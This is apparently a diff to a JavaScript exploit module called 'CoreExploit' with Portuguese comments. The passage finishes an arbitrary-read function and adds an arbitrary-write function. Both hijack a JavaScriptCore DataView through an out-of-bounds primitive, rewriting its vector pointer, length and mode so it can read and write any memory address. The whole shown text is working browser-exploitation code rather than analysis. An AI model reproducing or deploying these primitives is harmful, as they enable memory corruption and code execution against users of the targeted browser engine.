@@ -993,4 +993,131 @@ export async function arb_read(absolute_address, byteLength) {
         oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4);
         // TEMPORARIAMENTE: Força o m_mode para um valor que permite acesso universal (0x0000000B).
         // Isto é crucial se o m_mode original (0x0) não permitir leituras arbitrárias.
-        oob_write_absolute(OOB_DV
+        oob_write_absolute(OOB_DV_M_MODE_OFFSET, JSC_OFFSETS.DataView.M_MODE_VALUE, 4); 
+        log(`[${FNAME}] DEBUG: Valores do DataView APÓS MANIPULAÇÃO: m_vector=${toHexHelper(oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8))}, m_length=${toHex(oob_read_absolute(OOB_DV_M_LENGTH_OFFSET, 4))}, m_mode=${toHex(oob_read_absolute(OOB_DV_M_MODE_OFFSET, 4))}.`, 'debug');
+
+        log(`[${FNAME}] DEBUG: Realizando leitura arbitrária de ${addr64.toString(true)} (byteLength: ${byteLength}).`, 'debug');
+        switch (byteLength) {
+            case 1: result_val = oob_dataview_real.getUint8(0); break;
+            case 2: result_val = oob_dataview_real.getUint16(0, true); break;
+            case 4: result_val = oob_dataview_real.getUint32(0, true); break;
+            case 8: {
+                const low = oob_dataview_real.getUint32(0, true);
+                const high = oob_dataview_real.getUint32(4, true);
+                result_val = new AdvancedInt64(low, high);
+                break;
+            }
+            default: throw new Error(`Invalid byteLength for arb_read: ${byteLength}`);
+        }
+        log(`[${FNAME}] DEBUG: Leitura arbitrária concluída. Resultado: ${toHexHelper(result_val, byteLength * 8)}.`, 'debug');
+        return result_val;
+    } catch (e) {
+        log(`ERRO CRÍTICO em ${FNAME} ao ler de ${addr64.toString(true)} (byteLength: ${byteLength}): ${e.message}`, "critical", FNAME);
+        isOOBEnvironmentSetup = false;
+        throw e;
+    } finally {
+        if (isAdvancedInt64Object(m_vector_orig_snap) && typeof m_length_orig_snap === 'number' && typeof m_mode_orig_snap === 'number' && isOOBReady()) {
+            log(`[${FNAME}] DEBUG: Restaurando metadados originais do DataView.`, 'debug');
+            try {
+                oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, m_vector_orig_snap, 8);
+                oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, m_length_orig_snap, 4);
+                oob_write_absolute(OOB_DV_M_MODE_OFFSET, m_mode_orig_snap, 4); // Restaura o m_mode original
+                await _perform_explicit_dv_reset_after_arb_op(FNAME);
+                log(`[${FNAME}] DEBUG: Restauração de metadados concluída com sucesso.`, 'debug');
+            } catch (e_restore) {
+                log(`[${FNAME}] ERRO CRÍTICO restaurando/resetando metadados: ${e_restore.message}. Ambiente agora INSEGURo.`, 'critical');
+                isOOBEnvironmentSetup = false;
+            }
+        } else if (isOOBReady()) {
+            log(`[${FNAME}] ALERTA: Não pôde restaurar metadados. Ambiente instável.`, 'critical');
+            isOOBEnvironmentSetup = false;
+        } else {
+            log(`[${FNAME}] ALERTA: Não foi possível restaurar metadados. Ambiente OOB já estava inválido ou foi comprometido.`, 'critical');
+        }
+    }
+}
+
+export async function arb_write(absolute_address, value, byteLength) {
+    const FNAME = 'CoreExploit.arb_write (v31.14)';
+    if (!isOOBReady()) {
+        log(`[${FNAME}] Ambiente OOB não está pronto para escrita arbitrária. Tentando re-inicializar...`, 'warn');
+        await triggerOOB_primitive({ force_reinit: true });
+        if (!isOOBReady()) {
+            throw new Error("Ambiente OOB não pôde ser inicializado para escrita arbitrária.");
+        }
+    }
+    let addr64 = absolute_address;
+    if (!isAdvancedInt64Object(addr64)) {
+        try { addr64 = new AdvancedInt64(addr64); } catch (e) {
+            throw new TypeError(`Endereço para arb_write deve ser AdvancedInt64 ou conversível: ${e.message}`);
+        }
+        if (!isAdvancedInt64Object(addr64)) {
+            throw new TypeError(`Endereço convertido para arb_write não é AdvancedInt64 válido.`);
+        }
+    }
+
+    let m_vector_orig_snap, m_length_orig_snap, m_mode_orig_snap;
+    try {
+        log(`[${FNAME}] DEBUG: Realizando snapshots de metadados do DataView antes da manipulação para escrita.`, 'debug');
+        m_vector_orig_snap = oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8);
+        m_length_orig_snap = oob_read_absolute(OOB_DV_M_LENGTH_OFFSET, 4);
+        m_mode_orig_snap = oob_read_absolute(OOB_DV_M_MODE_OFFSET, 4); // Captura o m_mode original
+        log(`[${FNAME}] DEBUG: Snapshots ORIGINAIS: m_vector=${toHexHelper(m_vector_orig_snap)}, m_length=${toHex(m_length_orig_snap)}, m_mode=${toHex(m_mode_orig_snap)}`, 'debug');
+
+
+        if (!isAdvancedInt64Object(m_vector_orig_snap)) {
+            log(`[${FNAME}] ALERTA CRÍTICO: m_vector_orig_snap NÃO é AdvancedInt64. A restauração falhará.`, 'critical');
+            isOOBEnvironmentSetup = false;
+            throw new Error("Falha ao ler m_vector original como AdvancedInt64 em arb_write.");
+        }
+
+        log(`[${FNAME}] DEBUG: Escrevendo NOVO m_vector (${toHexHelper(addr64)}), m_length (0xFFFFFFFF) E M_MODE (0x0000000B) para escrita arbitrária.`, 'debug');
+        oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, addr64, 8);
+        oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4);
+        // TEMPORARIAMENTE: Força o m_mode para um valor que permite acesso universal (0x0000000B).
+        oob_write_absolute(OOB_DV_M_MODE_OFFSET, JSC_OFFSETS.DataView.M_MODE_VALUE, 4);
+        log(`[${FNAME}] DEBUG: Valores do DataView APÓS MANIPULAÇÃO: m_vector=${toHexHelper(oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8))}, m_length=${toHex(oob_read_absolute(OOB_DV_M_LENGTH_OFFSET, 4))}, m_mode=${toHex(oob_read_absolute(OOB_DV_M_MODE_OFFSET, 4))}.`, 'debug');
+
+
+        log(`[${FNAME}] DEBUG: Realizando escrita arbitrária em ${addr64.toString(true)} (valor: ${toHexHelper(value, byteLength * 8)}, byteLength: ${byteLength}).`, 'debug');
+        let val64_write;
+        switch (byteLength) {
+            case 1: oob_dataview_real.setUint8(0, Number(value)); break;
+            case 2: oob_dataview_real.setUint16(0, Number(value), true); break;
+            case 4: oob_dataview_real.setUint32(0, Number(value), true); break;
+            case 8:
+                val64_write = isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
+                if (!isAdvancedInt64Object(val64_write)) {
+                    throw new TypeError("Valor para escrita de 8 bytes não é AdvancedInt64 válido após conversão.");
+                }
+                oob_dataview_real.setUint32(0, val64_write.low(), true);
+                oob_dataview_real.setUint32(4, val64_write.high(), true);
+                break;
+            default: throw new Error("Invalid byteLength para arb_write");
+        }
+        log(`[${FNAME}] DEBUG: Escrita arbitrária concluída.`, 'debug');
+    } catch (e) {
+        log(`ERRO CRÍTICO em ${FNAME} ao escrever em ${addr64.toString(true)} (valor: ${toHexHelper(value, byteLength * 8)}, byteLength: ${byteLength}): ${e.message}`, "critical", FNAME);
+        isOOBEnvironmentSetup = false;
+        throw e;
+    } finally {
+        if (isAdvancedInt64Object(m_vector_orig_snap) && typeof m_length_orig_snap === 'number' && typeof m_mode_orig_snap === 'number' && isOOBReady()) {
+            log(`[${FNAME}] DEBUG: Restaurando metadados originais do DataView após escrita.`, 'debug');
+            try {
+                oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, m_vector_orig_snap, 8);
+                oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, m_length_orig_snap, 4);
+                oob_write_absolute(OOB_DV_M_MODE_OFFSET, m_mode_orig_snap, 4); // Restaura o m_mode original
+                await _perform_explicit_dv_reset_after_arb_op(FNAME);
+                log(`[${FNAME}] DEBUG: Restauração de metadados concluída com sucesso.`, 'debug');
+            } catch (eR) {
+                log(`[${FNAME}] ERRO CRÍTICO restaurando/resetando metadados: ${eR.message}. Ambiente agora INSEGURo.`, 'critical');
+                isOOBEnvironmentSetup = false;
+            }
+        } else if (isOOBReady()) {
+            log(`[${FNAME}] ALERTA: Não pôde restaurar metadados. Ambiente instável.`, 'critical');
+            isOOBEnvironmentSetup = false;
+        } else {
+            log(`[${FNAME}] ALERTA: Não foi possível restaurar metadados. Ambiente OOB já estava inválido ou foi comprometido.`, 'critical');
+        }
+    }
+}
